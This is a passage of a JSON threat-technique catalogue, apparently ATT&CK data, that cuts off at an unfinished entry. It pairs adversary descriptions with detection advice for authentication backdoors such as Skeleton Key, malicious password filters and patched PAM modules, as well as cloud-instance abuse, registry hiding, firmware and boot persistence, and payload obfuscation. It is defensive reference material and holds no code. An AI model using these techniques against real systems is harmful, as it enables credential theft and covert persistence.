        "detection": "\nMonitor for new, unfamiliar DLL files written to a domain controller and/or local computer. Monitor for changes to Registry entries for password filters (ex: HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages) and correlate then investigate the DLL files these files reference. Password filters will also show up as an autorun and loaded DLL in lsass.exe. Monitor for calls to OpenProcess that can be used to manipulate lsass.exe running on a domain controller as well as for malicious modifications to functions exported from authentication-related system DLLs (such as cryptdll.dll and samsrv.dll).  Monitor PAM configuration and module paths (ex: /etc/pam.d/) for changes. Use system-integrity tools such as AIDE and monitoring tools such as auditd to monitor PAM files.Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services.   Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\n"
      },
      "T1556.001": {
        "name": "Domain Controller Authentication",
        "description": " \nAdversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts. \nMalware may be used to inject false credentials into the authentication process on a domain controller with the intent of creating a backdoor used to access any user’s account and/or credentials (ex:  Skeleton Key ). Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system. Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller). Authenticated access may enable unfettered access to hosts and/or resources within single-factor authentication environments.  \n ",
        "detection": "\nMonitor for calls to OpenProcess that can be used to manipulate lsass.exe running on a domain controller as well as for malicious modifications to functions exported from authentication-related system DLLs (such as cryptdll.dll and samsrv.dll). Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services.  Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g. a user has an active login session but has not entered the building or does not have VPN access). \n\n"
      },
      "T1556.002": {
        "name": "Password Filter DLL",
        "description": " \nAdversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated. \nWindows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation. \nAdversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.  \n ",
        "detection": "\nMonitor for new, unfamiliar DLL files written to a domain controller and/or local computer. Monitor for changes to Registry entries for password filters (ex: HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages) and correlate then investigate the DLL files these files reference.Password filters will also show up as an autorun and loaded DLL in lsass.exe. \n\n"
      },
      "T1556.003": {
        "name": "Pluggable Authentication Modules",
        "description": " \nAdversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is  pam_unix.so , which retrieves, sets, and verifies account authentication information in  /etc/passwd and  /etc/shadow .  \n \n \n\nAdversaries may modify components of the PAM system to create backdoors. PAM components, such as  pam_unix.so , can be patched to accept arbitrary adversary supplied values as legitimate credentials.  \n\nMalicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.  \n \n ",
        "detection": "\nMonitor PAM configuration and module paths (ex: /etc/pam.d/) for changes. Use system-integrity tools such as AIDE and monitoring tools such as auditd to monitor PAM files.Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times (ex: when the user is not present) or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\n"
      },
      "T1556.004": {
        "name": "Network Device Authentication",
        "description": " \nAdversaries may use  Patch System Image to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices. \n Modify System Image may include implanted code to the operating system for network devices to provide access for adversaries using a specific password.  The modification includes a specific password which is implanted in the operating system image via the patch.  Upon authentication attempts, the inserted code will first check to see if the user input is the password. If so, access is granted. Otherwise, the implanted code will pass the credentials on for verification of potentially valid credentials.  \n ",
        "detection": "\nConsider verifying the checksum of the operating system file and verifying the image of the operating system in memory.  Detection of this behavior may be difficult, detection efforts may be focused on closely related adversary behaviors, such as Modify System Image.\n\n"
      },
      "T1578": {
        "name": "Modify Cloud Compute Infrastructure",
        "description": " \nAn adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots. \nPermissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.  \n ",
        "detection": "\nEstablish centralized logging for the activity of cloud compute infrastructure components. Monitor for suspicious sequences of events, such as the creation of multiple snapshots within a short period of time or the mount of a snapshot to a new instance by a new or unexpected user. To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones.\n\n"
      },
      "T1578.001": {
        "name": "Create Snapshot",
        "description": " \nAn adversary may create a snapshot or data backup within a cloud account to evade defenses. A snapshot is a point-in-time copy of an existing cloud compute component such as a virtual machine (VM), virtual hard drive, or volume. An adversary may leverage permissions to create a snapshot in order to bypass restrictions that prevent access to existing compute service infrastructure, unlike in  Revert Cloud Instance where an adversary may revert to a snapshot to evade detection and remove evidence of their presence. \nAn adversary may  Create Cloud Instance , mount one or more created snapshots to that instance, and then apply a policy that allows the adversary access to the created instance, such as a firewall policy that allows them inbound and outbound SSH access.  \n ",
        "detection": "\nThe creation of a snapshot is a common part of operations within many cloud environments. Events should then not be viewed in isolation, but as part of a chain of behavior that could lead to other activities such as the creation of one or more snapshots and the restoration of these snapshots by a new user account.In AWS, CloudTrail logs capture the creation of snapshots and all API calls for AWS Backup as events. Using the information collected by CloudTrail, you can determine the request that was made, the IP address from which the request was made, which user made the request, when it was made, and additional details. .In Azure, the creation of a snapshot may be captured in Azure activity logs. Backup restoration events can also be detected through Azure Monitor Log Data by creating a custom alert for completed restore jobs. Google's Admin Activity audit logs within their Cloud Audit logs can be used to detect the usage of the gcloud compute instances create command to create a new VM disk from a snapshot.  It is also possible to detect the usage of the GCP API with the \"sourceSnapshot\": parameter pointed to \"global/snapshots/[BOOT_SNAPSHOT_NAME]. \n\n"
      },
      "T1578.002": {
        "name": "Create Cloud Instance",
        "description": " \nAn adversary may create a new instance or virtual machine (VM) within the compute service of a cloud account to evade defenses. Creating a new instance may allow an adversary to bypass firewall rules and permissions that exist on instances currently residing within an account. An adversary may  Create Snapshot of one or more volumes in an account, create a new instance, mount the snapshots, and then apply a less restrictive security policy to collect  Data from Local System or for  Remote Data Staging .  \n\nCreating a new instance may also allow an adversary to carry out malicious activity within an environment without affecting the execution of current running instances.  ",
        "detection": "\nThe creation of a new instance or VM is a common part of operations within many cloud environments. Events should then not be viewed in isolation, but as part of a chain of behavior that could lead to other activities. For example, the creation of an instance by a new user account or the unexpected creation of one or more snapshots followed by the creation of an instance may indicate suspicious activity.In AWS, CloudTrail logs capture the creation of an instance in the RunInstances event, and in Azure the creation of a VM may be captured in Azure activity logs.   Google's Admin Activity audit logs within their Cloud Audit logs can be used to detect the usage of gcloud compute instances create to create a VM. \n\n"
      },
      "T1578.003": {
        "name": "Delete Cloud Instance",
        "description": " \nAn adversary may delete a cloud instance after they have performed malicious activities in an attempt to evade detection and remove evidence of their presence.  Deleting an instance or virtual machine can remove valuable forensic artifacts and other evidence of suspicious behavior if the instance is not recoverable. \nAn adversary may also  Create Cloud Instance and later terminate the instance after achieving their objectives.  \n ",
        "detection": "\nThe deletion of a new instance or virtual machine is a common part of operations within many cloud environments. Events should then not be viewed in isolation, but as part of a chain of behavior that could lead to other activities. For example, detecting a sequence of events such as the creation of an instance, mounting of a snapshot to that instance, and deletion of that instance by a new user account may indicate suspicious activity.In AWS, CloudTrail logs capture the deletion of an instance in the TerminateInstances event, and in Azure the deletion of a VM may be captured in Azure activity logs.   Google's Admin Activity audit logs within their Cloud Audit logs can be used to detect the usage of gcloud compute instances delete to delete a VM. \n\n"
      },
      "T1578.004": {
        "name": "Revert Cloud Instance",
        "description": " \nAn adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs. \nAnother variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM.  \n \n ",
        "detection": "\nEstablish centralized logging of instance activity, which can be used to monitor and review system events even after reverting to a snapshot, rolling back changes, or changing persistence/type of storage. Monitor specifically for events related to snapshots and rollbacks and VM configuration changes, that are occurring outside of normal activity. To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones.\n\n"
      },
      "T1112": {
        "name": "Modify Registry",
        "description": " \nAdversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution. \nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility  Reg may be used for local or remote Registry modification.  \nOther tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API. \nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via  Reg or other utilities using the Win32 API.  \nAdversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \n  \n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  \nOften  Valid Accounts are required, along with access to the remote system's  SMB/Windows Admin Shares for RPC communication.  ",
        "detection": "\nModifications to the Registry are normal and occur throughout typical use of the Windows operating system. Consider enabling Registry Auditing on specific keys to produce an alertable event (Event ID 4657) whenever a value is changed (though this may not trigger when values are created with Reghide or other evasive methods).   Changes to Registry entries that load software on Windows startup that do not correlate with known software, patch cycles, etc., are suspicious, as are additions or changes to files within the startup folder. Changes could also include new services and modification of existing binary paths to point to malicious files. If a change to a service-related entry occurs, then it will likely be followed by a local or remote service start or restart to execute the file.Monitor processes and command-line arguments for actions that could be taken to change or delete information in the Registry. Remote access tools with built-in features may interact directly with the Windows API to gather information. The Registry may also be modified through Windows system management tools such as Windows Management Instrumentation and PowerShell, which may require additional logging features to be configured in the operating system to collect necessary information for analysis.Monitor for processes, command-line arguments, and API calls associated with concealing Registry keys, such as Reghide.   Inspect and cleanup malicious hidden Registry entries using Native Windows API calls and/or tools such as Autoruns   and RegDelNull  .\n\n"
      },
      "T1601": {
        "name": "Modify System Image",
        "description": " \nAdversaries may make changes to the operating system of embedded network devices to weaken defenses and provide new capabilities for themselves.  On such devices, the operating systems are typically monolithic and most of the device functionality and capabilities are contained within a single file. \nTo change the operating system, the adversary typically only needs to affect this one file, replacing or modifying it.  This can either be done live in memory during system runtime for immediate effect, or in storage to implement the change on the next boot of the network device.  ",
        "detection": "\nMost embedded network devices provide a command to print the version of the currently running operating system.  Use this command to query the operating system for its version number and compare it to what is expected for the device in question.  Because this method may be used in conjunction with Patch System Image, it may be appropriate to also verify the integrity of the vendor provided operating system image file. Compare the checksum of the operating system file with the checksum of a known good copy from a trusted source.  Some embedded network device platforms may have the capability to calculate the checksum of the file, while others may not.  Even for those platforms that have the capability, it is recommended to download a copy of the file to a trusted computer to calculate the checksum with software that is not compromised.   Many vendors of embedded network devices can provide advanced debugging support that will allow them to work with device owners to validate the integrity of the operating system running in memory.  If a compromise of the operating system is suspected, contact the vendor technical support and seek such services for a more thorough inspection of the current running system.   \n\n"
      },
      "T1601.001": {
        "name": "Patch System Image",
        "description": " \nAdversaries may modify the operating system of a network device to introduce new capabilities or weaken existing defenses.  \n  \n  \n  \n  \nSome network devices are built with a monolithic architecture, where the entire operating system and most of the functionality of the device is contained within a single file.  Adversaries may change this file in storage, to be loaded in a future boot, or in memory during runtime. \nTo change the operating system in storage, the adversary will typically use the standard procedures available to device operators. This may involve downloading a new file via typical protocols used on network devices, such as TFTP, FTP, SCP, or a console connection.  The original file may be overwritten, or a new file may be written alongside of it and the device reconfigured to boot to the compromised image. \nTo change the operating system in memory, the adversary typically can use one of two methods. In the first, the adversary would make use of native debug commands in the original, unaltered running operating system that allow them to directly modify the relevant memory addresses containing the running operating system.  This method typically requires administrative level access to the device. \nIn the second method for changing the operating system in memory, the adversary would make use of the boot loader. The boot loader is the first piece of software that loads when the device starts that, in turn, will launch the operating system.  Adversaries may use malicious code previously implanted in the boot loader, such as through the  ROMMONkit method, to directly manipulate running operating system code in memory.  This malicious code in the bootloader provides the capability of direct memory manipulation to the adversary, allowing them to patch the live operating system during runtime. \nBy modifying the instructions stored in the system image file, adversaries may either weaken existing defenses or provision new capabilities that the device did not have before. Examples of existing defenses that can be impeded include encryption, via  Weaken Encryption , authentication, via  Network Device Authentication , and perimeter defenses, via  Network Boundary Bridging .  Adding new capabilities for the adversary’s purpose include  Keylogging ,  Multi-hop Proxy , and  Port Knocking . \nAdversaries may also compromise existing commands in the operating system to produce false output to mislead defenders.   When this method is used in conjunction with  Downgrade System Image , one example of a compromised system command may include changing the output of the command that shows the version of the currently running operating system.  By patching the operating system, the adversary can change this command to instead display the original, higher revision number that they replaced through the system downgrade. \nWhen the operating system is patched in storage, this can be achieved in either the resident storage (typically a form of flash memory, which is non-volatile) or via  TFTP Boot . \nWhen the technique is performed on the running operating system in memory and not on the stored copy, this technique will not survive across reboots.  However, live memory modification of the operating system can be combined with  ROMMONkit to achieve persistence.  ",
        "detection": "\nCompare the checksum of the operating system file with the checksum of a known good copy from a trusted source.  Some embedded network device platforms may have the capability to calculate the checksum of the file, while others may not.  Even for those platforms that have the capability, it is recommended to download a copy of the file to a trusted computer to calculate the checksum with software that is not compromised. Many vendors of embedded network devices can provide advanced debugging support that will allow them to work with device owners to validate the integrity of the operating system running in memory.  If a compromise of the operating system is suspected, contact the vendor technical support and seek such services for a more thorough inspection of the current running system.   \n\n"
      },
      "T1601.002": {
        "name": "Downgrade System Image",
        "description": " \nAdversaries may install an older version of the operating system of a network device to weaken security.  Older operating system versions on network devices often have weaker encryption ciphers and, in general, fewer/less updated defensive features.  \n\nOn embedded devices, downgrading the version typically only requires replacing the operating system file in storage.  With most embedded devices, this can be achieved by downloading a copy of the desired version of the operating system file and reconfiguring the device to boot from that file on next system restart.  The adversary could then restart the device to implement the change immediately or they could wait until the next time the system restarts. \nDowngrading the system image to an older versions may allow an adversary to evade defenses by enabling behaviors such as  Weaken Encryption .  Downgrading of a system image can be done on its own, or it can be used in conjunction with  Patch System Image .  ",
        "detection": "\nMany embedded network devices provide a command to print the version of the currently running operating system.  Use this command to query the operating system for its version number and compare it to what is expected for the device in question.  Because image downgrade may be used in conjunction with Patch System Image, it may be appropriate to also verify the integrity of the vendor provided operating system image file. \n\n"
      },
      "T1599": {
        "name": "Network Boundary Bridging",
        "description": " \nAdversaries may bridge network boundaries by compromising perimeter network devices. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks. \nDevices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks.  They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections.  Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications.  To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised. \nWhen an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance.  By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as command and control via  Multi-hop Proxy or exfiltration of data via  Traffic Duplication .  In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments.  ",
        "detection": "\nConsider monitoring network traffic on both interfaces of border network devices with out-of-band packet capture or network flow data, using a different device than the one in question.  Look for traffic that should be prohibited by the intended network traffic policy enforcement for the border network device.Monitor the border network device’s configuration to validate that the policy enforcement sections are what was intended.  Look for rules that are less restrictive, or that allow specific traffic types that were not previously authorized.\n\n"
      },
      "T1599.001": {
        "name": "Network Address Translation Traversal",
        "description": " \nAdversaries may bridge network boundaries by modifying a network device’s Network Address Translation (NAT) configuration. Malicious modifications to NAT may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks. \nNetwork devices such as routers and firewalls that connect multiple networks together may implement NAT during the process of passing packets between networks. When performing NAT, the network device will rewrite the source and/or destination addresses of the IP address header. Some network designs require NAT for the packets to cross the border device.  A typical example of this is environments where internal networks make use of non-Internet routable addresses.  \n\nWhen an adversary gains control of a network boundary device, they can either leverage existing NAT configurations to send traffic between two separated networks, or they can implement NAT configurations of their own design.  In the case of network designs that require NAT to function, this enables the adversary to overcome inherent routing limitations that would normally prevent them from accessing protected systems behind the border device.  In the case of network designs that do not require NAT, address translation can be used by adversaries to obscure their activities, as changing the addresses of packets that traverse a network boundary device can make monitoring data transmissions more challenging for defenders. \nAdversaries may use  Patch System Image to change the operating system of a network device, implementing their own custom NAT mechanisms to further obscure their activities  ",
        "detection": "\nConsider monitoring network traffic on both interfaces of border network devices.  Compare packets transmitted by the device between networks to look for signs of NAT being implemented.  Packets which have their IP addresses changed should still have the same size and contents in the data encapsulated beyond Layer 3.  In some cases, Port Address Translation (PAT) may also be used by an adversary.Monitor the border network device’s configuration to determine if any unintended NAT rules have been added without authorization.\n\n"
      },
      "T1027": {
        "name": "Obfuscated Files or Information",
        "description": " \nAdversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and  Deobfuscate/Decode Files or Information for  User Execution . The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  \nAdversaries may also used compressed or archived scripts, such as JavaScript. \nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  \nPayloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled.  \n\nAdversaries may also obfuscate commands executed from payloads or directly via a  Command and Scripting Interpreter . Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.  \n  \n \n  ",
        "detection": "\nDetection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system). Flag and analyze commands containing indicators of obfuscation and known suspicious syntax such as uninterpreted escape characters like '''^''' and '''\"'''. Windows' Sysmon and Event ID 4688 displays command-line arguments for processes. Deobfuscation tools can be used to detect these indicators in files/payloads.       Obfuscation used in payloads for Initial Access can be detected at the network. Use network intrusion detection systems and email gateway filtering to identify compressed and encrypted attachments and scripts. Some email attachment detonation systems can open compressed and encrypted attachments. Payloads delivered over an encrypted connection from a website require encrypted network traffic inspection. The first detection of a malicious tool may trigger an anti-virus or other security tool alert. Similar events may also occur at the boundary through network IDS, email scanning appliance, etc. The initial detection should be treated as an indication of a potentially more invasive intrusion. The alerting system should be thoroughly investigated beyond that initial alert for activity that was not detected. Adversaries may continue with an operation, assuming that individual events like an anti-virus detect will not be investigated or that an analyst will not be able to conclusively link that event to other activity occurring on the network. \n\n"
      },
      "T1027.001": {
        "name": "Binary Padding",
        "description": " \nAdversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations. \nBinary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures.  \nThe padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware.  \nIncreasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.  \n  ",
        "detection": "\nDepending on the method used to pad files, a file-based signature may be capable of detecting padding using a scanning or on-access based tool.  When executed, the resulting process from padded files may also exhibit other behavior characteristics of being used to conduct an intrusion such as system and network information Discovery or Lateral Movement, which could be used as event indicators that point to the source file. \n\n"
      },
      "T1027.002": {
        "name": "Software Packing",
        "description": " \nAdversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.  \n \nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available,  \nbut adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.  ",
        "detection": "\nUse file scanning to look for known software packers or artifacts of packing techniques. Packing is not a definitive indicator of malicious activity, because legitimate software may use packing techniques to reduce binary size or to protect proprietary code.\n\n"
      },
      "T1027.003": {
        "name": "Steganography",
        "description": " \nAdversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files. \n Duqu was an early example of malware that used steganography. It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server.  \n \nBy the end of 2017, a threat group used  Invoke-PSImage to hide  PowerShell commands in an image file (.png) and execute the code on a victim's system. In this particular case the  PowerShell code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.  \n  ",
        "detection": "\nDetection of steganography is difficult unless artifacts are left behind by the obfuscation process that are detectable with a known signature. Look for strings are other signatures left in system artifacts related to decoding steganography.\n\n"
      },
      "T1027.004": {
        "name": "Compile After Delivery",
        "description": " \nAdversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC/MinGW.  \n\nSource code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a  Phishing . Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.  \n ",
        "detection": "\nMonitor the execution file paths and command-line arguments for common compilers, such as csc.exe and GCC/MinGW, and correlate with other suspicious behavior to reduce false positives from normal user and administrator behavior. The compilation of payloads may also generate file creation and/or file write events. Look for non-native binary formats and cross-platform compiler and execution frameworks like Mono and determine if they have a legitimate purpose on the system.  Typically these should only be used in specific and limited cases, like for software development.\n\n"
      },
      "T1027.005": {
        "name": "Indicator Removal from Tools",
        "description": " \nAdversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems. \nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware.  ",
        "detection": "\nThe first detection of a malicious tool may trigger an anti-virus or other security tool alert. Similar events may also occur at the boundary through network IDS, email scanning appliance, etc. The initial detection should be treated as an indication of a potentially more invasive intrusion. The alerting system should be thoroughly investigated beyond that initial alert for activity that was not detected. Adversaries may continue with an operation, assuming that individual events like an anti-virus detect will not be investigated or that an analyst will not be able to conclusively link that event to other activity occurring on the network.\n\n"
      },
      "T1542": {
        "name": "Pre-OS Boot",
        "description": " \nAdversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control.  \n\nAdversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.  ",
        "detection": "\nPerform integrity checking on pre-OS boot mechanisms that can be manipulated for malicious purposes. Take snapshots of boot records and firmware and compare against known good images. Log changes to boot records, BIOS, and EFI, which can be performed by API calls, and compare against known good behavior and patching.Disk check, forensic utilities, and data from device drivers (i.e. processes and API calls) may reveal anomalies that warrant deeper investigation.  \n\n"
      },
      "T1542.001": {
        "name": "System Firmware",
        "description": " \nAdversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.  \n  \n  \n\nSystem firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.  ",
        "detection": "\nSystem firmware manipulation may be detected.   Dump and inspect BIOS images on vulnerable systems and compare against known good images.   Analyze differences to determine if malicious changes have occurred. Log attempts to read/write to BIOS and compare against known patching behavior.Likewise, EFI modules can be collected and compared against a known-clean list of EFI executable binaries to detect potentially malicious modules. The CHIPSEC framework can be used for analysis to determine if firmware modifications have been performed.      \n\n"
      },
      "T1542.002": {
        "name": "Component Firmware",
        "description": " \nAdversaries may modify component firmware to persist on systems. Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to  System Firmware but conducted upon other system components/devices that may not have the same capability or level of integrity checking. \nMalicious component firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.  ",
        "detection": "\nData and telemetry from use of device drivers (i.e. processes and API calls) and/or provided by SMART (Self-Monitoring, Analysis and Reporting Technology)     disk monitoring may reveal malicious manipulations of components. Otherwise, this technique may be difficult to detect since malicious activity is taking place on system components possibly outside the purview of OS security and integrity mechanisms.Disk check and forensic utilities   may reveal indicators of malicious firmware such as strings, unexpected disk partition table entries, or blocks of otherwise unusual memory that warrant deeper investigation. Also consider comparing components, including hashes of component firmware and behavior, against known good images.\n\n"
      },
      "T1542.003": {
        "name": "Bootkit",
        "description": " \nAdversaries may use bootkits to persist on systems. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly. \nA bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR).  \nThe MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code.  \n\nThe MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.  ",
        "detection": "\nPerform integrity checking on MBR and VBR. Take snapshots of MBR and VBR and compare against known good samples. Report changes to MBR and VBR as they occur for indicators of suspicious activity and further analysis.\n\n"
      },
      "T1542.004": {
        "name": "ROMMONkit",
        "description": " \nAdversaries may abuse the ROM Monitor (ROMMON) by loading an unauthorized firmware with adversary code to provide persistent access and manipulate device behavior that is difficult to detect.  \n \n\nROMMON is a Cisco network device firmware that functions as a boot loader, boot image, or boot helper to initialize hardware and software when the platform is powered on or reset. Similar to  TFTP Boot , an adversary may upgrade the ROMMON image locally or remotely (for example, through TFTP) with adversary code and restart the device in order to overwrite the existing ROMMON image. This provides adversaries with the means to update the ROMMON to gain persistence on a system in a way that may be difficult to detect.  ",
        "detection": "\nThere are no documented means for defenders to validate the operation of the ROMMON outside of vendor support. If a network device is suspected of being compromised, contact the vendor to assist in further investigation.\n\n"
      },
      "T1542.005": {
        "name": "TFTP Boot",
        "description": " \nAdversaries may abuse netbooting to load an unauthorized network device operating system from a Trivial File Transfer Protocol (TFTP) server. TFTP boot (netbooting) is commonly used by network administrators to load configuration-controlled network device images from a centralized management server. Netbooting is one option in the boot sequence and can be used to centralize, manage, and control device images. \nAdversaries may manipulate the configuration on the network device specifying use of a malicious TFTP server, which may be used in conjunction with  Modify System Image to load a modified image on device startup or reset. The unauthorized image allows adversaries to modify device configuration, add malicious capabilities to the device, and introduce backdoors to maintain control of the network device while minimizing detection through use of a standard functionality. This technique is similar to  ROMMONkit and may result in the network device running a modified image.  \n ",
        "detection": "\nConsider comparing a copy of the network device configuration and system image against a known-good version to discover unauthorized changes to system boot, startup configuration, or the running OS.    The same process can be accomplished through a comparison of the run-time memory, though this is non-trivial and may require assistance from the vendor.   Review command history in either the console or as part of the running memory to determine if unauthorized or suspicious commands were used to modify device configuration.   Check boot information including system uptime, image booted, and startup configuration to determine if results are consistent with expected behavior in the environment.   Monitor unusual connections or connection attempts to the device that may specifically target TFTP or other file-sharing protocols.\n\n"
      },
      "T1055": {
        "name": "Process Injection",
